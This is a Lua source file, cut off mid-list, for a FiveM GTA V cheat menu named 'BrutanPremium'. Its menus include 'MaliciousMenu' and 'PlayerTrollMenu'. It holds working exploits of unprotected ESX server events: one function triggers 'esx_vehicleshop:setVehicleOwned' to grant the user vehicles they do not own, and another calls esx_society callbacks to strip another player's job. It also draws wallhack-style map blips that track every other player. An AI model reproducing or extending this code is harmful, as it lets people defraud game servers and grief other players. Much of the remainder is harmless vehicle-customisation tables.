


enabled = enabled
KAKAAKAKAK = enabled


TriggerServerEvent = TriggerServerEvent


GetHashKey = GetHashKey


BrutanPremium = { } 
BrutanPremium.debug = false

jd366213 = false
KZjx = jd366213
ihrug = nil
WADUI = ihrug

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = nil
		enum.handle = nil
	end
}
wdihwaduaw = true
jejejejej = wdihwaduaw
xjbvxyg3e = jejejejej
waduyh487r64 = xjbvxyg3e


function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = true
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = nil, nil
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

function GetAllPeds()
    local peds123 = {}
    for ped in EnumeratePeds() do
        if DoesEntityExist(ped) then
            table.insert(peds123, ped)
        end
    end
    return peds123
end



  
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
	local Coordinates = GetEntityCoords(Entity, false)
	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
end

function GetGroundZ(X, Y, Z)
	if tonumber(X) and tonumber(Y) and tonumber(Z) then
		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
		return GroundZ
	else
		return 0.0
	end
end

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end

Citizen.CreateThread(function()
	RequestAnimDict("rcmjosh2")
	while not HasAnimDictLoaded("rcmjosh2") do
		Citizen.Wait(250)
	end
	while true do
		Citizen.Wait(0)



		local Ped = PlayerPedId()
		local AttachedEntity = GetEntityAttachedTo(Ped)

		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
			if DoesEntityExist(Deer.Handle) then
				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
				local Speed, Range = Deer.Speed.Walk, 4000.0


				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

				if Deer.Marker then
					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
				end
			end
		end
	end
end)



local Enabled = true

local states = {}
states.frozen = false
states.frozenPos = nil
kkkk = "brutanpremium"
local planeisbest = false
local dEI = kkkk


local ojtgh = "50.0"
local a = 1

local cg = true
local ch = false
local ci = true
local chdata = {}
	function mysplit(inputstr, sep)
		if sep == nil then
			sep = "%s"
		end
		local t={} ; i=1
		for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
			t[i] = str
			i = i + 1
		end
		return t
	end

	local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
                            "TeleportMenu", "LSC", "Hedit", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "SettingsMenu", "VRPMenu"}
	
local handlingData = {
	"handlingName",
	"fMass",
	"fInitialDragCoeff",
	"fPercentSubmerged",
	"vecCentreOfMassOffset",
	"vecInertiaMultiplier",
	"fDriveBiasFront",
	"nInitialDriveGears",
	"fInitialDriveForce",
	"fDriveInertia",
	"fClutchChangeRateScaleUpShift",
	"fClutchChangeRateScaleDownShift",
	"fInitialDriveMaxFlatVel",
	"fBrakeForce",
	"fBrakeBiasFront",
	"fHandBrakeForce",
	"fSteeringLock",
	"fTractionCurveMax",
	"fTractionCurveMin",
	"fTractionCurveLateral",
	"fTractionSpringDeltaMax",
	"fLowSpeedTractionLossMult",
	"fCamberStiffnesss",
	"fTractionBiasFront",
	"fTractionLossMult",
	"fSuspensionForce",
	"fSuspensionCompDamp",
	"fSuspensionReboundDamp",
	"fSuspensionUpperLimit",
	"fSuspensionLowerLimit",
	"fSuspensionRaise",
	"fSuspensionBiasFront",
	"fTractionCurveMax",
	"fAntiRollBarForce",
	"fAntiRollBarBiasFront",
	"fRollCentreHeightFront",
	"fRollCentreHeightRear",
	"fCollisionDamageMult",
	"fWeaponDamageMult",
	"fDeformationDamageMult",
	"fEngineDamageMult",
	"fPetrolTankVolume",
	"fOilVolume",
	"fSeatOffsetDistX",
	"fSeatOffsetDistY",
	"fSeatOffsetDistZ",
	"nMonetaryValue",
	"strModelFlags",
	"strHandlingFlags",
	"strDamageFlags",
	"AIHandling",
	
	
	"fThrust",
	"fThrustFallOff",
	"fThrustVectoring",
	"fYawMult",
	"fYawStabilise",
	"fSideSlipMult",
	"fRollMult",
	"fRollStabilise",
	"fPitchMult",
	"fPitchStabilise",
	"fFormLiftMult",
	"fAttackLiftMult",
	"fAttackDiveMult",
	"fGearDownDragV",
	"fGearDownLiftMult",
	"fWindMult",
	"fMoveRes",
	"vecTurnRes",
	"vecSpeedRes",
	"fGearDoorFrontOpen",
	"fGearDoorRearOpen",
	"fGearDoorRearOpen2",
	"fGearDoorRearMOpen",
	"fTurublenceMagnitudeMax",
	"fTurublenceForceMulti",
	"fTurublenceRollTorqueMulti",
	"fTurublencePitchTorqueMulti",
	"fBodyDamageControlEffectMult",
	"fInputSensitivityForDifficulty",
	"fOnGroundYawBoostSpeedPeak",
	"fOnGroundYawBoostSpeedCap",
	"fEngineOffGlideMulti",
	"handlingType",
	"fThrustFallOff",
	"fThrustFallOff",
	
	
	"fBackEndPopUpCarImpulseMult",
	"fBackEndPopUpBuildingImpulseMult",
	"fBackEndPopUpMaxDeltaSpeed",
	
	

	
	"fLeanFwdCOMMult",
	"fLeanFwdForceMult",
	"fLeanBakCOMMult",
	"fLeanBakForceMult",
	"fMaxBankAngle",
	"fFullAnimAngle",
	"fDesLeanReturnFrac",
	"fStickLeanMult",
	"fBrakingStabilityMult",
	"fInAirSteerMult",
	"fWheelieBalancePoint",
	"fStoppieBalancePoint",
	"fWheelieSteerMult",
	"fRearBalanceMult",
	"fFrontBalanceMult",
	"fBikeGroundSideFrictionMult",
	"fBikeWheelGroundSideFrictionMult",
	"fBikeOnStandLeanAngle",
	"fBikeOnStandSteerAngle",
	"fJumpForce",
}



Citizen.CreateThread(function()

	function SetVehicleHandlingData(Vehicle,Data,Value) 
		if DoesEntityExist(Vehicle) and Data and Value then
			for theKey,property in pairs(handlingData) do 
				if property == Data then
					local intfind = string.find(property, "n" ) 
					local floatfind = string.find(property, "f" )
					local strfind = string.find(property, "str" )
					local vecfind = string.find(property, "vec" )
					
					
					if intfind ~= nil and intfind == 1 then
						SetVehicleHandlingInt( Vehicle, "CHandlingData", Data, tonumber(Value) ) 
					elseif floatfind ~= nil and floatfind == 1 then
						local Value = tonumber(Value)+.0
						SetVehicleHandlingFloat( Vehicle, "CHandlingData", Data, tonumber(Value) )
					elseif strfind ~= nil and strfind == 1 then
						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
					elseif vecfind ~= nil and vecfind == 1 then
						SetVehicleHandlingVector( Vehicle, "CHandlingData", Data, Value )
					else
						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
					end
				end
			end
		end
	end
	
	
	function GetVehicleHandlingData(Vehicle,Data)
		if DoesEntityExist(Vehicle) then
			for theKey,property in pairs(handlingData) do 
				if property == Data then
					local intfind = string.find(property, "n" )
					local floatfind = string.find(property, "f" )
					local strfind = string.find(property, "str" )
					local vecfind = string.find(property, "vec" )
					
					if intfind ~= nil and intfind == 1 then
						return GetVehicleHandlingInt( Vehicle, "CHandlingData", Data )
					elseif floatfind ~= nil and floatfind == 1 then
						return GetVehicleHandlingFloat( Vehicle, "CHandlingData", Data )
					elseif vecfind ~= nil and vecfind == 1 then
						return GetVehicleHandlingVector( Vehicle, "CHandlingData", Data )
					else
						return false
					end
				end
			end
		end
	end
	
	function GetAllVehicleHandlingData(Vehicle)
		local VehicleHandlingData = {}
		if DoesEntityExist(Vehicle) then
			for i,theData in pairs(handlingData) do 
				local intfind = string.find(theData, "n" )
				local floatfind = string.find(theData, "f" )
				local strfind = string.find(theData, "str" )
				local vecfind = string.find(theData, "vec" )
				
				if intfind ~= nil and intfind == 1 and GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ), type = "int" }  )
				elseif floatfind ~= nil and floatfind == 1 and GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ), type = "float" } )
				elseif vecfind ~= nil and vecfind == 1 and GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ), type = "vector3" } )
				end
			end
			return VehicleHandlingData
		end
	end
	
		
	
	
end
)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)
		if(states.frozen)then
			ClearPedTasksImmediately(GetPlayerPed(-1))
			SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
		end
	end
end)

Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for i = 0, 128 do
                if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                   local ped = GetPlayerPed(i)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(i), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(i)
                    if ch then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cg then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, i)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, i)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, i)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end

local function e()
    local name = GetPlayerName(PlayerId())
end
local o = {}
local h = false
rot = 1
local j = false
local bw = true
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {
        {
            name = "Spoilers", id = 0
        }, {
            name = "Front Bumper", id = 1
        }, {
            name = "Rear Bumper", id = 2
        }, {
            name = "Side Skirt", id = 3
        }, {
            name = "Exhaust", id = 4
        }, {
            name = "Frame", id = 5
        }, {
            name = "Grille", id = 6
        }, {
            name = "Hood", id = 7
        }, {
            name = "Fender", id = 8
        }, {
            name = "Right Fender", id = 9
        }, {
            name = "Roof", id = 10
        }, {
            name = "Vanity Plates", id = 25
        }, {
            name = "Trim", id = 27
        }, {
            name = "Ornaments", id = 28
        }, {
            name = "Dashboard", id = 29
        }, {
            name = "Dial", id = 30
        }, {
            name = "Door Speaker", id = 31
        }, {
            name = "Seats", id = 32
        }, {
            name = "Steering Wheel", id = 33
        }, {
            name = "Shifter Leavers", id = 34
        }, {
            name = "Plaques", id = 35
        }, {
            name = "Speakers", id = 36
        }, {
            name = "Trunk", id = 37
        }, {
            name = "Hydraulics", id = 38
        }, {
            name = "Engine Block", id = 39
        }, {
            name = "Air Filter", id = 40
        }, {
            name = "Struts", id = 41
        }, {
            name = "Arch Cover", id = 42
        }, {
            name = "Aerials", id = 43
        }, {
            name = "Trim 2", id = 44
        }, {
            name = "Tank", id = 45
        }, {
            name = "Windows", id = 46
        }, {
            name = "Livery", id = 48
        }, {
            name = "Wheels", id = 23
        }, {
            name = "Wheel Types", id = "wheeltypes"
        }, {
            name = "Extras", id = "extra"
        }, {
            name = "Neons", id = "neon"
        }, {
            name = "Paint", id = "paint"
        }, {
            name = "Headlights Color", id = "headlight"
        },  {
            name = "Licence Plate", id = "licence"                           
        }
    }
    
    local be = {
        {
            name = "Engine", id = 11
        }, {
            name = "Brakes", id = 12
        }, {
            name = "Transmission", id = 13
        }, {
            name = "Suspension", id = 15
        }
    }
    
    local bo = {
        {
            name = "Default", id = -1
        }, {
            name = "White", id = 0
        }, {
            name = "Blue", id = 1
        }, {
            name = "Electric Blue", id = 2
        }, {
            name = "Mint Green", id = 3
        }, {
            name = "Lime Green", id = 4
        }, {
            name = "Yellow", id = 5
        }, {
            name = "Golden Shower", id = 6
        }, {
            name = "Orange", id = 7
        }, {
            name = "Red", id = 8
        }, {
            name = "Pony Pink", id = 9
        }, {
            name = "Hot Pink", id = 10
        }, {
            name = "Purple", id = 11
        }, {
            name = "Blacklight", id = 12
        }
    }
    
    local colors = {
        ["White"] = {
            255, 255, 255
        }, ["Blue"] = {
            0, 0, 255
        }, ["Electric Blue"] = {
            0, 150, 255
        }, ["Mint Green"] = {
            50, 255, 155
        }, ["Lime Green"] = {
            0, 255, 0
        }, ["Yellow"] = {
            255, 255, 0
        }, ["Golden Shower"] = {
            204, 204, 0
        }, ["Orange"] = {
            255, 128, 0
        }, ["Red"] = {
            255, 0, 0
        }, ["Pony Pink"] = {
            255, 102, 255
        }, ["Hot Pink"] = {
            255, 0, 255
        }, ["Purple"] = {
            153, 0, 153
        }
    }
    
	-- 4x482
	
    local bg = {
        {
            name = "Black", id = 0
        }, {
            name = "Carbon Black", id = 147
        }, {
            name = "Graphite", id = 1
        }, {
            name = "Anhracite Black", id = 11
        }, {
            name = "Black Steel", id = 2
        }, {
            name = "Dark Steel", id = 3
        }, {
            name = "Silver", id = 4
        }, {
            name = "Bluish Silver", id = 5
        }, {
            name = "Rolled Steel", id = 6
        }, {
            name = "Shadow Silver", id = 7
        }, {
            name = "Stone Silver", id = 8
        }, {
            name = "Midnight Silver", id = 9
        }, {
            name = "Cast Iron Silver", id = 10
        }, {
            name = "Red", id = 27
        }, {
            name = "Torino Red", id = 28
        }, {
            name = "Formula Red", id = 29
        }, {
            name = "Lava Red", id = 150
        }, {
            name = "Blaze Red", id = 30
        }, {
            name = "Grace Red", id = 31
        }, {
            name = "Garnet Red", id = 32
        }, {
            name = "Sunset Red", id = 33
        }, {
            name = "Cabernet Red", id = 34
        }, {
            name = "Wine Red", id = 143
        }, {
            name = "Candy Red", id = 35
        }, {
            name = "Hot Pink", id = 135
        }, {
            name = "Pfsiter Pink", id = 137
        }, {
            name = "Salmon Pink", id = 136
        }, {
            name = "Sunrise Orange", id = 36
        }, {
            name = "Orange", id = 38
        }, {
            name = "Bright Orange", id = 138
        }, {
            name = "Gold", id = 99
        }, {
            name = "Bronze", id = 90
        }, {
            name = "Yellow", id = 88
        }, {
            name = "Race Yellow", id = 89
        }, {
            name = "Dew Yellow", id = 91
        }, {
            name = "Dark Green", id = 49
        }, {
            name = "Racing Green", id = 50
        }, {
            name = "Sea Green", id = 51
        }, {
            name = "Olive Green", id = 52
        }, {
            name = "Bright Green", id = 53
        }, {
            name = "Gasoline Green", id = 54
        }, {
            name = "Lime Green", id = 92
        }, {
            name = "Midnight Blue", id = 141
        }, {
            name = "Galaxy Blue", id = 61
        }, {
            name = "Dark Blue", id = 62
        }, {
            name = "Saxon Blue", id = 63
        }, {
            name = "Blue", id = 64
        }, {
            name = "Mariner Blue", id = 65
        }, {
            name = "Harbor Blue", id = 66
        }, {
            name = "Diamond Blue", id = 67
        }, {
            name = "Surf Blue", id = 68
        }, {
            name = "Nautical Blue", id = 69
        }, {
            name = "Racing Blue", id = 73
        }, {
            name = "Ultra Blue", id = 70
        }, {
            name = "Light Blue", id = 74
        }, {
            name = "Chocolate Brown", id = 96
        }, {
            name = "Bison Brown", id = 101
        }, {
            name = "Creeen Brown", id = 95
        }, {
            name = "Feltzer Brown", id = 94
        }, {
            name = "Maple Brown", id = 97
        }, {
            name = "Beechwood Brown", id = 103
        }, {
            name = "Sienna Brown", id = 104
        }, {
            name = "Saddle Brown", id = 98
        }, {
            name = "Moss Brown", id = 100
        }, {
            name = "Woodbeech Brown", id = 102
        }, {
            name = "Straw Brown", id = 99
        }, {
            name = "Sandy Brown", id = 105
        }, {
            name = "Bleached Brown", id = 106
        }, {
            name = "Schafter Purple", id = 71
        }, {
            name = "Spinnaker Purple", id = 72
        }, {
            name = "Midnight Purple", id = 142
        }, {
            name = "Bright Purple", id = 145
        }, {
            name = "Cream", id = 107
        }, {
            name = "Ice White", id = 111
        }, {
            name = "Frost White", id = 112
        }
    }
    
    local bi = {
        {
            name = "Black", id = 12
        }, {
            name = "Gray", id = 13
        }, {
            name = "Light Gray", id = 14
        }, {
            name = "Ice White", id = 131
        }, {
            name = "Blue", id = 83
        }, {
            name = "Dark Blue", id = 82
        }, {
            name = "Midnight Blue", id = 84
        }, {
            name = "Midnight Purple", id = 149
        }, {
            name = "Schafter Purple", id = 148
        }, {
            name = "Red", id = 39
        }, {
            name = "Dark Red", id = 40
        }, {
            name = "Orange", id = 41
        }, {
            name = "Yellow", id = 42
        }, {
            name = "Lime Green", id = 55
        }, {
            name = "Green", id = 128
        }, {
            name = "Forest Green", id = 151
        }, {
            name = "Foliage Green", id = 155
        }, {
            name = "Olive Darb", id = 152
        }, {
            name = "Dark Earth", id = 153
        }, {
            name = "Desert Tan", id = 154
        }
    }
    
    local bj = {
        {
            name = "Brushed Steel", id = 117
        }, {
            name = "Brushed Black Steel", id = 118
        }, {
            name = "Brushed Aluminum", id = 119
        }, {
            name = "Pure Gold", id = 158
        }, {
            name = "Brushed Gold", id = 159
        }
    }
local bk = false


local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end


function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end

local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
